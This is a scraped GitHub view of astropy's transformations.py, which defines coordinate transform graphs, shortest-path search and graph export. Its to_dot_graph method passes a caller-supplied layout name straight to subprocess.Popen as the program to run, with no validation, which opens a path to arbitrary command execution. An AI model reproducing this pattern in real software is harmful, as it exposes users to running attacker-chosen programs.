=== Content from github.com_c82b9319_20250111_103858.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fastropy%2Fastropy%2Fblob%2F9b97d98802ee4f5350a62b681c35d8687ee81d91%2Fastropy%2Fcoordinates%2Ftransformations.py)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fastropy%2Fastropy%2Fblob%2F9b97d98802ee4f5350a62b681c35d8687ee81d91%2Fastropy%2Fcoordinates%2Ftransformations.py)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=astropy%2Fastropy)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[astropy](/astropy)
/
**[astropy](/astropy/astropy)**
Public

* [Notifications](/login?return_to=%2Fastropy%2Fastropy) You must be signed in to change notification settings
* [Fork
  1.8k](/login?return_to=%2Fastropy%2Fastropy)
* [Star
   4.5k](/login?return_to=%2Fastropy%2Fastropy)

* [Code](/astropy/astropy)
* [Issues
  1.3k](/astropy/astropy/issues)
* [Pull requests
  89](/astropy/astropy/pulls)
* [Actions](/astropy/astropy/actions)
* [Projects
  2](/astropy/astropy/projects)
* [Wiki](/astropy/astropy/wiki)
* [Security](/astropy/astropy/security)
* [Insights](/astropy/astropy/pulse)

Additional navigation options

* [Code](/astropy/astropy)
* [Issues](/astropy/astropy/issues)
* [Pull requests](/astropy/astropy/pulls)
* [Actions](/astropy/astropy/actions)
* [Projects](/astropy/astropy/projects)
* [Wiki](/astropy/astropy/wiki)
* [Security](/astropy/astropy/security)
* [Insights](/astropy/astropy/pulse)

## Files

 9b97d98
## Breadcrumbs

1. [astropy](/astropy/astropy/tree/9b97d98802ee4f5350a62b681c35d8687ee81d91)
2. /[astropy](/astropy/astropy/tree/9b97d98802ee4f5350a62b681c35d8687ee81d91/astropy)
3. /[coordinates](/astropy/astropy/tree/9b97d98802ee4f5350a62b681c35d8687ee81d91/astropy/coordinates)
/
# transformations.py

Copy path Blame  Blame
## Latest commit

## History

[History](/astropy/astropy/commits/9b97d98802ee4f5350a62b681c35d8687ee81d91/astropy/coordinates/transformations.py)1676 lines (1416 loc) · 64.4 KB 9b97d98
## Breadcrumbs

1. [astropy](/astropy/astropy/tree/9b97d98802ee4f5350a62b681c35d8687ee81d91)
2. /[astropy](/astropy/astropy/tree/9b97d98802ee4f5350a62b681c35d8687ee81d91/astropy)
3. /[coordinates](/astropy/astropy/tree/9b97d98802ee4f5350a62b681c35d8687ee81d91/astropy/coordinates)
/
# transformations.py

Top
## File metadata and controls

* Code
* Blame

1676 lines (1416 loc) · 64.4 KB[Raw](https://github.com/astropy/astropy/raw/9b97d98802ee4f5350a62b681c35d8687ee81d91/astropy/coordinates/transformations.py)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042052062072082092102112122132142152162172182192202212222232242252262272282292302312322332342352362372382392402412422432442452462472482492502512522532542552562572582592602612622632642652662672682692702712722732742752762772782792802812822832842852862872882892902912922932942952962972982993003013023033043053063073083093103113123133143153163173183193203213223233243253263273283293303313323333343353363373383393403413423433443453463473483493503513523533543553563573583593603613623633643653663673683693703713723733743753763773783793803813823833843853863873883893903913923933943953963973983994004014024034044054064074084094104114124134144154164174184194204214224234244254264274284294304314324334344354364374384394404414424434444454464474484494504514524534544554564574584594604614624634644654664674684694704714724734744754764774784794804814824834844854864874884894904914924934944954964974984995005015025035045055065075085095105115125135145155165175185195205215225235245255265275285295305315325335345355365375385395405415425435445455465475485495505515525535545555565575585595605615625635645655665675685695705715725735745755765775785795805815825835845855865875885895905915925935945955965975985996006016026036046056066076086096106116126136146156166176186196206216226236246256266276286296306316326336346356366376386396406416426436446456466476486496506516526536546556566576586596606616626636646656666676686696706716726736746756766776786796806816826836846856866876886896906916926936946956966976986997007017027037047057067077087097107117127137147157167177187197207217227237247257267277287297307317327337347357367377387397407417427437447457467477487497507517527537547557567577587597607617627637647657667677687697707717727737747757767777787797807817827837847857867877887897907917927937947957967977987998008018028038048058068078088098108118128138148158168178188198208218228238248258268278288298308318328338348358368378388398408418428438448458468478488498508518528538548558568578588598608618628638648658668678688698708718728738748758768778788798808818828838848858868878888898908918928938948958968978988999009019029039049059069079089099109119129139149159169179189199209219229239249259269279289299309319329339349359369379389399409419429439449459469479489499509519529539549559569579589599609619629639649659669679689699709719729739749759769779789799809819829839849859869879889899909919929939949959969979989991000# Licensed under a 3-clause BSD style license - see LICENSE.rst
"""This module contains a general framework for defining graphs of transformationsbetween coordinates, suitable for either spatial coordinates or more generalizedcoordinate systems.
The fundamental idea is that each class is a node in the transformation graph,and transitions from one node to another are defined as functions (or methods)wrapped in transformation objects.
This module also includes more specific transformation classes forcelestial/spatial coordinate frames, generally focused around matrix-styletransformations that are typically how the algorithms are defined."""
import heapqimport subprocessfrom abc import ABCMeta, abstractmethodfrom collections import defaultdictfrom contextlib import contextmanager, suppressfrom inspect import signaturefrom warnings import warn
import numpy as np
from astropy import units as ufrom astropy.utils.exceptions import AstropyWarning
\_\_all\_\_ = [ "TransformGraph", "CoordinateTransform", "FunctionTransform", "BaseAffineTransform", "AffineTransform", "StaticMatrixTransform", "DynamicMatrixTransform", "FunctionTransformWithFiniteDifference", "CompositeTransform",]
def frame\_attrs\_from\_set(frame\_set): """ A `dict` of all the attributes of all frame classes in this `~astropy.coordinates.TransformGraph`.
 Broken out of the class so this can be called on a temporary frame set to validate new additions to the transform graph before actually adding them. """ result = {}
 for frame\_cls in frame\_set: result.update(frame\_cls.frame\_attributes)
 return result
def frame\_comps\_from\_set(frame\_set): """ A `set` of all component names every defined within any frame class in this `~astropy.coordinates.TransformGraph`.
 Broken out of the class so this can be called on a temporary frame set to validate new additions to the transform graph before actually adding them. """ result = set()
 for frame\_cls in frame\_set: rep\_info = frame\_cls.\_frame\_specific\_representation\_info for mappings in rep\_info.values(): for rep\_map in mappings: result.update([rep\_map.framename])
 return result
class TransformGraph: """ A graph representing the paths between coordinate frames. """
 def \_\_init\_\_(self): self.\_graph = defaultdict(dict) self.invalidate\_cache() # generates cache entries
 @property def \_cached\_names(self): if self.\_cached\_names\_dct is None: self.\_cached\_names\_dct = dct = {} for c in self.frame\_set: nm = getattr(c, "name", None) if nm is not None: if not isinstance(nm, list): nm = [nm] for name in nm: dct[name] = c
 return self.\_cached\_names\_dct
 @property def frame\_set(self): """ A `set` of all the frame classes present in this TransformGraph. """ if self.\_cached\_frame\_set is None: self.\_cached\_frame\_set = set() for a in self.\_graph: self.\_cached\_frame\_set.add(a) for b in self.\_graph[a]: self.\_cached\_frame\_set.add(b)
 return self.\_cached\_frame\_set.copy()
 @property def frame\_attributes(self): """ A `dict` of all the attributes of all frame classes in this TransformGraph. """ if self.\_cached\_frame\_attributes is None: self.\_cached\_frame\_attributes = frame\_attrs\_from\_set(self.frame\_set)
 return self.\_cached\_frame\_attributes
 @property def frame\_component\_names(self): """ A `set` of all component names every defined within any frame class in this TransformGraph. """ if self.\_cached\_component\_names is None: self.\_cached\_component\_names = frame\_comps\_from\_set(self.frame\_set)
 return self.\_cached\_component\_names
 def invalidate\_cache(self): """ Invalidates the cache that stores optimizations for traversing the transform graph. This is called automatically when transforms are added or removed, but will need to be called manually if weights on transforms are modified inplace. """ self.\_cached\_names\_dct = None self.\_cached\_frame\_set = None self.\_cached\_frame\_attributes = None self.\_cached\_component\_names = None self.\_shortestpaths = {} self.\_composite\_cache = {}
 def add\_transform(self, fromsys, tosys, transform): """Add a new coordinate transformation to the graph.
 Parameters ---------- fromsys : class The coordinate frame class to start from. tosys : class The coordinate frame class to transform into. transform : `~astropy.coordinates.CoordinateTransform` The transformation object. Typically a `~astropy.coordinates.CoordinateTransform` object, although it may be some other callable that is called with the same signature.
 Raises ------ TypeError If ``fromsys`` or ``tosys`` are not classes or ``transform`` is not callable.
 """ if not isinstance(fromsys, type): raise TypeError("fromsys must be a class") if not isinstance(tosys, type): raise TypeError("tosys must be a class") if not callable(transform): raise TypeError("transform must be callable")
 frame\_set = self.frame\_set.copy() frame\_set.add(fromsys) frame\_set.add(tosys)
 # Now we check to see if any attributes on the proposed frames override # \*any\* component names, which we can't allow for some of the logic in # the SkyCoord initializer to work attrs = set(frame\_attrs\_from\_set(frame\_set).keys()) comps = frame\_comps\_from\_set(frame\_set)
 invalid\_attrs = attrs.intersection(comps) if invalid\_attrs: invalid\_frames = set() for attr in invalid\_attrs: if attr in fromsys.frame\_attributes: invalid\_frames.update([fromsys])
 if attr in tosys.frame\_attributes: invalid\_frames.update([tosys])
 raise ValueError( f"Frame(s) {list(invalid\_frames)} contain invalid attribute names:" f" {invalid\_attrs}\nFrame attributes can not conflict with \*any\* of" " the frame data component names (see" " `frame\_transform\_graph.frame\_component\_names`)." )
 self.\_graph[fromsys][tosys] = transform self.invalidate\_cache()
 def remove\_transform(self, fromsys, tosys, transform): """ Removes a coordinate transform from the graph.
 Parameters ---------- fromsys : class or None The coordinate frame \*class\* to start from. If `None`, ``transform`` will be searched for and removed (``tosys`` must also be `None`). tosys : class or None The coordinate frame \*class\* to transform into. If `None`, ``transform`` will be searched for and removed (``fromsys`` must also be `None`). transform : callable or None The transformation object to be removed or `None`. If `None` and ``tosys`` and ``fromsys`` are supplied, there will be no check to ensure the correct object is removed. """ if fromsys is None or tosys is None: if tosys is not fromsys: raise ValueError("fromsys and tosys must both be None if either are") if transform is None: raise ValueError("cannot give all Nones to remove\_transform")
 # search for the requested transform by brute force and remove it for a, agraph in self.\_graph.items(): for b, bgraph in agraph.items(): if bgraph is transform: del agraph[b] fromsys = a break
 # If the transform was found, need to break out of the outer for loop too if fromsys: break else: raise ValueError(f"Could not find transform {transform} in the graph")
 elif transform is None or self.\_graph[fromsys].get(tosys, None) is transform: self.\_graph[fromsys].pop(tosys, None) else: raise ValueError( f"Current transform from {fromsys} to {tosys} is not {transform}" )
 # Remove the subgraph if it is now empty if self.\_graph[fromsys] == {}: self.\_graph.pop(fromsys)
 self.invalidate\_cache()
 def find\_shortest\_path(self, fromsys, tosys): """ Computes the shortest distance along the transform graph from one system to another.
 Parameters ---------- fromsys : class The coordinate frame class to start from. tosys : class The coordinate frame class to transform into.
 Returns ------- path : list of class or None The path from ``fromsys`` to ``tosys`` as an in-order sequence of classes. This list includes \*both\* ``fromsys`` and ``tosys``. Is `None` if there is no possible path. distance : float or int The total distance/priority from ``fromsys`` to ``tosys``. If priorities are not set this is the number of transforms needed. Is ``inf`` if there is no possible path. """ inf = float("inf")
 # special-case the 0 or 1-path if tosys is fromsys and tosys not in self.\_graph[fromsys]: # Means there's no transform necessary to go from it to itself. return [tosys], 0 if tosys in self.\_graph[fromsys]: # this will also catch the case where tosys is fromsys, but has # a defined transform. t = self.\_graph[fromsys][tosys] return [fromsys, tosys], float(getattr(t, "priority", 1))
 # otherwise, need to construct the path:
 if fromsys in self.\_shortestpaths: # already have a cached result return self.\_shortestpaths[fromsys].get(tosys, (None, inf))
 # use Dijkstra's algorithm to find shortest path in all other cases
 # We store nodes as `dict` keys because differently from `list` uniqueness is # guaranteed and differently from `set` insertion order is preserved. nodes = {} for node, node\_graph in self.\_graph.items(): nodes[node] = None nodes |= {node: None for node in node\_graph}
 if fromsys not in nodes or tosys not in nodes: # fromsys or tosys are isolated or not registered, so there's # certainly no way to get from one to the other return None, inf
 edgeweights = {} # construct another graph that is a dict of dicts of priorities # (used as edge weights in Dijkstra's algorithm) for a, graph in self.\_graph.items(): edgeweights[a] = {b: float(getattr(graph[b], "priority", 1)) for b in graph}
 # entries in q are [distance, count, nodeobj, pathlist] # count is needed because in py 3.x, tie-breaking fails on the nodes. # this way, insertion order is preserved if the weights are the same q = [[0, -1, fromsys, []]] q.extend([inf, i, n, []] for i, n in enumerate(nodes) if n is not fromsys)
 # this dict will store the distance to node from ``fromsys`` and the path result = {}
 # definitely starts as a valid heap because of the insert line; from the # node to itself is always the shortest distance while q: d, orderi, n, path = heapq.heappop(q)
 if d == inf: # everything left is unreachable from fromsys, just copy them to # the results and jump out of the loop result[n] = (None, d) for d, orderi, n, path in q: result[n] = (None, d) break result[n] = (path, d) path.append(n) if n not in edgeweights: # this is a system that can be transformed to, but not from. continue for n2 in edgeweights[n]: if n2 not in result: # already visited # find where n2 is in the heap for q\_elem in q: if q\_elem[2] == n2: if (newd := d + edgeweights[n][n2]) < q\_elem[0]: q\_elem[0] = newd q\_elem[3] = list(path) heapq.heapify(q) break else: raise ValueError("n2 not in heap - this should be impossible!")
 # cache for later use self.\_shortestpaths[fromsys] = result return result[tosys]
 def get\_transform(self, fromsys, tosys): """Generates and returns the CompositeTransform for a transformation between two coordinate systems.
 Parameters ---------- fromsys : class The coordinate frame class to start from. tosys : class The coordinate frame class to transform into.
 Returns ------- trans : `~astropy.coordinates.CompositeTransform` or None If there is a path from ``fromsys`` to ``tosys``, this is a transform object for that path. If no path could be found, this is `None`.
 Notes ----- A `~astropy.coordinates.CompositeTransform` is always returned, because `~astropy.coordinates.CompositeTransform` is slightly more adaptable in the way it can be called than other transform classes. Specifically, it takes care of intermediate steps of transformations in a way that is consistent with 1-hop transformations.
 """ if not isinstance(fromsys, type): raise TypeError("fromsys is not a class") if not isinstance(tosys, type): raise TypeError("tosys is not a class")
 path, distance = self.find\_shortest\_path(fromsys, tosys)
 if path is None: return None
 transforms = [] currsys = fromsys for p in path[1:]: # first element is fromsys so we skip it transforms.append(self.\_graph[currsys][p]) currsys = p
 fttuple = (fromsys, tosys) if fttuple not in self.\_composite\_cache: comptrans = CompositeTransform( transforms, fromsys, tosys, register\_graph=False ) self.\_composite\_cache[fttuple] = comptrans return self.\_composite\_cache[fttuple]
 def lookup\_name(self, name): """ Tries to locate the coordinate class with the provided alias.
 Parameters ---------- name : str The alias to look up.
 Returns ------- `BaseCoordinateFrame` subclass The coordinate class corresponding to the ``name`` or `None` if no such class exists. """ return self.\_cached\_names.get(name, None)
 def get\_names(self): """ Returns all available transform names. They will all be valid arguments to `lookup\_name`.
 Returns ------- nms : list The aliases for coordinate systems. """ return list(self.\_cached\_names.keys())
 def to\_dot\_graph( self, priorities=True, addnodes=[], savefn=None, savelayout="plain", saveformat=None, color\_edges=True, ): """ Converts this transform graph to the graphviz\_ DOT format.
 Optionally saves it (requires `graphviz`\_ be installed and on your path).
 .. \_graphviz: http://www.graphviz.org/
 Parameters ---------- priorities : bool If `True`, show the priority values for each transform. Otherwise, the will not be included in the graph. addnodes : sequence of str Additional coordinate systems to add (this can include systems already in the transform graph, but they will only appear once). savefn : None or str The file name to save this graph to or `None` to not save to a file. savelayout : str The graphviz program to use to layout the graph (see graphviz\_ for details) or 'plain' to just save the DOT graph content. Ignored if ``savefn`` is `None`. saveformat : str The graphviz output format. (e.g. the ``-Txxx`` option for the command line program - see graphviz docs for details). Ignored if ``savefn`` is `None`. color\_edges : bool Color the edges between two nodes (frames) based on the type of transform. ``FunctionTransform``: red, ``StaticMatrixTransform``: blue, ``DynamicMatrixTransform``: green.
 Returns ------- dotgraph : str A string with the DOT format graph. """ # We store nodes as `dict` keys because differently from `list` uniqueness is # guaranteed and differently from `set` insertion order is preserved. nodes = {} for node, node\_graph in self.\_graph.items(): nodes[node] = None nodes |= {node: None for node in node\_graph} nodes |= {node: None for node in addnodes} nodenames = [] invclsaliases = { f: [k for k, v in self.\_cached\_names.items() if v == f] for f in self.frame\_set } for n in nodes: if n in invclsaliases: aliases = "`\\n`".join(invclsaliases[n]) nodenames.append( '{0} [shape=oval label="{0}\\n`{1}`"]'.format(n.\_\_name\_\_, aliases) ) else: nodenames.append(n.\_\_name\_\_ + "[ shape=oval ]")
 edgenames = [] # Now the edges for a, agraph in self.\_graph.items(): for b, transform in agraph.items(): pri = getattr(transform, "priority", 1) color = trans\_to\_color[transform.\_\_class\_\_] if color\_edges else "black" edgenames.append((a.\_\_name\_\_, b.\_\_name\_\_, pri, color))
 # generate simple dot format graph lines = ["digraph AstropyCoordinateTransformGraph {"] lines.append("graph [rankdir=LR]") lines.append("; ".join(nodenames) + ";") for enm1, enm2, weights, color in edgenames: labelstr\_fmt = "[ {0} {1} ]" priority\_part = f'label = "{weights}"' if priorities else "" color\_part = f'color = "{color}"' labelstr = labelstr\_fmt.format(priority\_part, color\_part) lines.append(f"{enm1} -> {enm2}{labelstr};") lines.append("") lines.append("overlap=false") lines.append("}") dotgraph = "\n".join(lines)
 if savefn is not None: if savelayout == "plain": with open(savefn, "w") as f: f.write(dotgraph) else: args = [savelayout] if saveformat is not None: args.append("-T" + saveformat) proc = subprocess.Popen( args, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, ) stdout, stderr = proc.communicate(dotgraph) if proc.returncode != 0: raise OSError("problem running graphviz: \n" + stderr)
 with open(savefn, "w") as f: f.write(stdout)
 return dotgraph
 def to\_networkx\_graph(self): """ Converts this transform graph into a networkx graph.
 .. note:: You must have the `networkx <https://networkx.github.io/>`\_ package installed for this to work.
 Returns ------- nxgraph : ``networkx.Graph`` This `~astropy.coordinates.TransformGraph` as a `networkx.Graph <https://networkx.github.io/documentation/stable/reference/classes/graph.html>`\_. """ import networkx as nx
 nxgraph = nx.Graph()
 # first make the nodes for a in self.\_graph: if a not in nxgraph: nxgraph.add\_node(a) for b in self.\_graph[a]: if b not in nxgraph: nxgraph.add\_node(b)
 # Now the edges for a in self.\_graph: agraph = self.\_graph[a] for b in agraph: transform = agraph[b] pri = transform.priority if hasattr(transform, "priority") else 1 color = trans\_to\_color[transform.\_\_class\_\_] nxgraph.add\_edge(a, b, weight=pri, color=color)
 return nxgraph
 def transform(self, transcls, fromsys, tosys, priority=1, \*\*kwargs): """A function decorator for defining transformations.
 .. note:: If decorating a static method of a class, ``@staticmethod`` should be added \*above\* this decorator.
 Parameters ---------- transcls : class The class of the transformation object to create. fromsys : class The coordinate frame class to start from. tosys : class The coordinate frame class to transform into. priority : float or int The priority if this transform when finding the shortest coordinate transform path - large numbers are lower priorities.
 Additional keyword arguments are passed into the ``transcls`` constructor.
 Returns ------- deco : function A function that can be called on another function as a decorator (see example).
 Notes ----- This decorator assumes the first argument of the ``transcls`` initializer accepts a callable, and that the second and third are ``fromsys`` and ``tosys``. If this is not true, you should just initialize the class manually and use `~astropy.coordinates.TransformGraph.add\_transform` instead of this decorator.
 Examples -------- ::
 graph = TransformGraph()
 class Frame1(BaseCoordinateFrame): ...
 class Frame2(BaseCoordinateFrame): ...
 @graph.transform(FunctionTransform, Frame1, Frame2) def f1\_to\_f2(f1\_obj): ... do something with f1\_obj ... return f2\_obj
 """
 def deco(func): # this doesn't do anything directly with the transform because # ``register\_graph=self`` stores it in the transform graph # automatically transcls( func, fromsys, tosys, priority=priority, register\_graph=self, \*\*kwargs ) return func
 return deco
 def \_add\_merged\_transform(self, fromsys, tosys, \*furthersys, priority=1): """ Add a single-step transform that encapsulates a multi-step transformation path, using the transforms that already exist in the graph.
 The created transform internally calls the existing transforms. If all of the transforms are affine, the merged transform is `~astropy.coordinates.DynamicMatrixTransform` (if there are no origin shifts) or `~astropy.coordinates.AffineTransform` (otherwise). If at least one of the transforms is not affine, the merged transform is `~astropy.coordinates.FunctionTransformWithFiniteDifference`.
 This method is primarily useful for defining loopback transformations (i.e., where ``fromsys`` and the final ``tosys`` are the same).
 Parameters ---------- fromsys : class The coordinate frame class to start from. tosys : class The coordinate frame class to transform to. \*furthersys : class Additional coordinate frame classes to transform to in order. priority : number The priority of this transform when finding the shortest coordinate transform path - large numbers are lower priorities.
 Notes ----- Even though the created transform is a single step in the graph, it will still internally call the constituent transforms. Thus, there is no performance benefit for using this created transform.
 For Astropy's built-in frames, loopback transformations typically use `~astropy.coordinates.ICRS` to be safe. Transforming through an inertial frame ensures that changes in observation time and observer location/velocity are properly accounted for.
 An error will be raised if a direct transform between ``fromsys`` and ``tosys`` already exist. """ frames = [fromsys, tosys, \*furthersys] lastsys = frames[-1] full\_path = self.get\_transform(fromsys, lastsys) transforms = [ self.get\_transform(frame\_a, frame\_b) for frame\_a, frame\_b in zip(frames[:-1], frames[1:]) ] if None in transforms: raise ValueError("This transformation path is not possible") if len(full\_path.transforms) == 1: raise ValueError( f"A direct transform for {fromsys.\_\_name\_\_}->{lastsys.\_\_name\_\_} already" " exists" )
 self.add\_transform( fromsys, lastsys, CompositeTransform( transforms, fromsys, lastsys, priority=priority ).\_as\_single\_transform(), )
 @contextmanager def impose\_finite\_difference\_dt(self, dt): """ Context manager to impose a finite-difference time step on all applicable transformations.
 For each transformation in this transformation graph that has the attribute ``finite\_difference\_dt``, that attribute is set to the provided value. The only standard transformation with this attribute is `~astropy.coordinates.FunctionTransformWithFiniteDifference`.
 Parameters ---------- dt : `~astropy.units.Quantity` ['time'] or callable If a quantity, this is the size of the differential used to do the finite difference. If a callable, should accept ``(fromcoord, toframe)`` and return the ``dt`` value. """ key = "finite\_difference\_dt" saved\_settings = []
 try: for to\_frames in self.\_graph.values(): for transform in to\_frames.values(): if hasattr(transform, key): old\_setting = (transform, key, getattr(transform, key)) saved\_settings.append(old\_setting) setattr(transform, key, dt) yield finally: for setting in saved\_settings: setattr(\*setting)
# <-------------------Define the builtin transform classes-------------------->
class CoordinateTransform(metaclass=ABCMeta): """ An object that transforms a coordinate from one system to another. Subclasses must implement `\_\_call\_\_` with the provided signature. They should also call this superclass's ``\_\_init\_\_`` in their ``\_\_init\_\_``.
 Parameters ---------- fromsys : `~astropy.coordinates.BaseCoordinateFrame` subclass The coordinate frame class to start from. tosys : `~astropy.coordinates.BaseCoordinateFrame` subclass The coordinate frame class to transform into. priority : float or int The priority if this transform when finding the shortest coordinate transform path - large numbers are lower priorities. register\_graph : `~astropy.coordinates.TransformGraph` or None A graph to register this transformation with on creation, or `None` to leave it unregistered. """
 def \_\_init\_\_(self, fromsys, tosys, priority=1, register\_graph=None): if not isinstance(fromsys, type): raise TypeError("fromsys must be a class") if not isinstance(tosys, type): raise TypeError("tosys must be a class")
 self.fromsys = fromsys self.tosys = tosys self.priority = float(priority)
 if register\_graph: # this will do the type-checking when it adds to the graph self.register(register\_graph) else: if not isinstance(fromsys, type) or not isinstance(tosys, type): raise TypeError("fromsys and tosys must be classes")
 self.overlapping\_frame\_attr\_names = overlap = [] if hasattr(fromsys, "frame\_attributes") and hasattr(tosys, "frame\_attributes"): # the if statement is there so that non-frame things might be usable # if it makes sense for from\_nm in fromsys.frame\_attributes: if from\_nm in tosys.frame\_attributes: overlap.append(from\_nm)
 def register(self, graph): """ Add this transformation to the requested Transformation graph, replacing anything already connecting these two coordinates.
 Parameters ---------- graph : `~astropy.coordinates.TransformGraph` object The graph to register this transformation with. """ graph.add\_transform(self.fromsys, self.tosys, self)
 def unregister(self, graph): """ Remove this transformation from the requested transformation graph.
 Parameters ---------- graph : a TransformGraph object The graph to unregister this transformation from.
 Raises ------ ValueError If this is not currently in the transform graph. """ graph.remove\_transform(self.fromsys, self.tosys, self)
 @abstractmethod def \_\_call\_\_(self, fromcoord, toframe): """ Does the actual coordinate transformation from the ``fromsys`` class to the ``tosys`` class.
 Parameters ---------- fromcoord : `~astropy.coordinates.BaseCoordinateFrame` subclass instance An object of class matching ``fromsys`` that is to be transformed. toframe : object An object that has the attributes necessary to fully specify the frame. That is, it must have attributes with names that match the keys of the dictionary ``tosys.frame\_attributes``. Typically this is of class ``tosys``, but it \*might\* be some other class as long as it has the appropriate attributes.
 Returns ------- tocoord : `~astropy.coordinates.BaseCoordinateFrame` subclass instance The new coordinate after the transform has been applied. """
class FunctionTransform(CoordinateTransform): """ A coordinate transformation defined by a function that accepts a coordinate object and returns the transformed coordinate object.
 Parameters ---------- func : callable The transformation function. Should have a call signature ``func(formcoord, toframe)``. Note that, unlike `CoordinateTransform.\_\_call\_\_`, ``toframe`` is assumed to be of type ``tosys`` for this function. fromsys : class The coordinate frame class to start from. tosys : class The coordinate frame class to transform into. priority : float or int The priority if this transform when finding the shortest coordinate transform path - large numbers are lower priorities. register\_graph : `~astropy.coordinates.TransformGraph` or None A graph to register this transformation with on creation, or `None` to leave it unregistered.
 Raises ------ TypeError If ``func`` is not callable. ValueError If ``func`` cannot accept two arguments.
 """
 def \_\_init\_\_(self, func, fromsys, tosys, priority=1, register\_graph=None): if not callable(func): raise TypeError("func must be callable")
 with suppress(TypeError): sig = signature(func) kinds = [x.kind for x in sig.parameters.values()] if ( len(x for x in kinds if x == sig.POSITIONAL\_ONLY) != 2 and sig.VAR\_POSITIONAL not in kinds ): raise ValueError("provided function does not accept two arguments")
 self.func = func
 super().\_\_init\_\_( fromsys, tosys, priority=priority, register\_graph=register\_graph )
 def \_\_call\_\_(self, fromcoord, toframe): res = self.func(fromcoord, toframe) if not isinstance(res, self.tosys): raise TypeError( f"the transformation function yielded {res} but " f"should have been of type {self.tosys}" ) if fromcoord.data.differentials and not res.data.differentials: warn( "Applied a FunctionTransform to a coordinate frame with " "differentials, but the FunctionTransform does not handle " "differentials, so they have been dropped.", AstropyWarning, ) return res
class FunctionTransformWithFiniteDifference(FunctionTransform): r"""Transormation based on functions using finite difference for velocities.
 A coordinate transformation that works like a `~astropy.coordinates.FunctionTransform`, but computes velocity shifts based on the finite-difference relative to one of the frame attributes. Note that the transform function should \*not\* change the differential at all in this case, as any differentials will be overridden.
 When a differential is in the from coordinate, the finite difference calculation has two components. The first part is simple the existing differential, but re-orientation (using finite-difference techniques) to point in the direction the velocity vector has in the \*new\* frame. The second component is the "induced" velocity. That is, the velocity intrinsic to the frame itself, estimated by shifting the frame using the ``finite\_difference\_frameattr\_name`` frame attribute a small amount (``finite\_difference\_dt``) in time and re-calculating the position.
 Parameters ---------- finite\_difference\_frameattr\_name : str or None The name of the frame attribute on the frames to use for the finite difference. Both the to and the from frame will be checked for this attribute, but only one needs to have it. If None, no velocity component induced from the frame itself will be included - only the re-orientation of any existing differential. finite\_difference\_dt : `~astropy.units.Quantity` ['time'] or callable If a quantity, this is the size of the differential used to do the finite difference. If a callable, should accept ``(fromcoord, toframe)`` and return the ``dt`` value. symmetric\_finite\_difference : bool If True, the finite difference is computed as :math:`\frac{x(t + \Delta t / 2) - x(t + \Delta t / 2)}{\Delta t}`, or if False, :math:`\frac{x(t + \Delta t) - x(t)}{\Delta t}`. The latter case has slightly better performance (and more stable finite difference behavior).
 All other parameters are identical to the initializer for `~astropy.coordinates.FunctionTransform`.
 """
